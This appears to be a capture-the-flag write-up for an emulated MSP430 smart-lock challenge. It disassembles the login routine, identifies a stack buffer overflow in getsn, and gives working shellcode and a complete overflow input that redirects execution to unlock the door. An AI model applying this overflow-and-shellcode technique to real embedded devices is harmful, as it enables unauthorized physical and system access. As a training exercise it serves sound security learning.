Module overview:
    LockIT Pro Hardware  Security Module 2 stores  the login password,
    ensuring users  can not access  the password through  other means.
    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
    HSM will  directly send the  correct unlock message to  the LockIT
    Pro Deadbolt  if the password  is correct, otherwise no  action is
    taken.
    
        This is  Software Revision  01. The firmware  has been  updated to
    connect with the new hardware security module. We have removed the
    function to unlock the door from the LockIT Pro firmware
    
Alright.
Let's begin our analysis.

<main> contains a call to <login>

44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 9645      call	#0x4596 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 9645      call	#0x4596 <puts>

We can safely ignore the above code.

4508:  3e40 3000      mov	#0x30, r14
450c:  0f41           mov	sp, r15
450e:  b012 8645      call	#0x4586 <getsn>

Breaking at 450e reveals the value of r15 to be 3478.
<getsn> is going to read 48 bytes into address 3478

4512:  0f41           mov	sp, r15
4514:  b012 4644      call	#0x4446 <conditional_unlock_door>
4518:  0f93           tst	r15
451a:  0324           jz	#0x4522 <login+0x2e>
451c:  3f40 c544      mov	#0x44c5 "Access granted.", r15
4520:  023c           jmp	#0x4526 <login+0x32>
4522:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4526:  b012 9645      call	#0x4596 <puts>
452a:  3150 1000      add	#0x10, sp
452e:  3041           ret

r15 must be != to 0 so we skip the jump at 451a and print "Access granted".

4446 <conditional_unlock_door>
4446:  0412           push	r4
4448:  0441           mov	sp, r4
444a:  2453           incd	r4
444c:  2183           decd	sp
444e:  c443 fcff      mov.b	#0x0, -0x4(r4)
4452:  3e40 fcff      mov	#0xfffc, r14
4456:  0e54           add	r4, r14
4458:  0e12           push	r14
445a:  0f12           push	r15
445c:  3012 7e00      push	#0x7e           
4460:  b012 3245      call	#0x4532 <INT>     ; Send the password to the Triggerbolt module -> password is in r15 (r15 = 3478) 
4464:  5f44 fcff      mov.b	-0x4(r4), r15
4468:  8f11           sxt	r15
446a:  3152           add	#0x8, sp
446c:  3441           pop	r4
446e:  3041           ret

Well.
We don't have access to the password, and the unlock mechanism and logic is stored in a different module.
Only way in would be to somehow execute a call to <INT> with 0x7f to unlock the door.
<getsn> reads 48 bytes.
Might be able to buffer overflow and execute some shellcode.
446a seems interesting.
Going to break on it and observe value of sp.
Maybe we'll be able to ret to some shellcode.

SP = 346c
Adding #0x8 to it will result in 3474.
Close to our buffer but not close enough.

Moving back to the <login> function.

4514:  b012 4644      call	#0x4446 <conditional_unlock_door>
4518:  0f93           tst	r15
451a:  0324           jz	#0x4522 <login+0x2e>
451c:  3f40 c544      mov	#0x44c5 "Access granted.", r15
4520:  023c           jmp	#0x4526 <login+0x32>
4522:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4526:  b012 9645      call	#0x4596 <puts>
452a:  3150 1000      add	#0x10, sp
452e:  3041           ret

Might be able to do something here with 452a.
Breaking at 452a.
sp = 3478 (Our password buffer!)
adding 0x10 results in 3488.
BINGO.

The goal here is to execute a call to <INT> with 0x7f as an argument.
Let's first turn that into shellcode using the assembler provided by the site.

code:
push #0x7f
call #0x4532

shellcode:
30127f00b0123245

8 bytes in total.
3478 (password entry) + 8 bytes of shellcode = 3480
Add another 8 bytes of junk followed by the address of the password entry 3478. (<- endianness so we'll be using 7834 in the actual input)

What's going to happen is that the sp will be pointing to the "3478" we entered at the end.
and when we hit the ret instruction it will move the PC to 3478 and begin executing the code that is located there (our shellcode).

Check hex.
Our input:
30127f00b0123245aaaaaaaaaaaaaaaa7834

Door unlocked.

